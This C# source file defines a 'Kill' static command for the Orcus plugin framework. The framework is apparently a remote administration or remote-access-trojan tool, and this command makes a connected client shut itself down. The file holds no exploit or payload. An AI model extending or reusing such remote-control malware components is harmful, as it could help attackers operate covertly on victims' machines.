using System;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.StaticCommands;

namespace Orcus.StaticCommands.Client
{
    public class KillCommand : StaticCommand
    {
        public override Guid CommandId { get; } = new Guid(0xef03d8a4, 0xfa90, 0x3f49, 0xba, 0xab, 0x4e, 0x97, 0x72,
            0xf7, 0x1b, 0x47);

        public override string Name { get; } = Resources.StaticCommands.Client_KillCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.Client_KillCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.Client;

        public override InputValidationResult ValidateInput()
        {
            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory,
            IClientInfo clientInfo)
        {
            feedbackFactory.Succeeded();
            clientInfo.ClientOperator.Exit();
        }
    }
}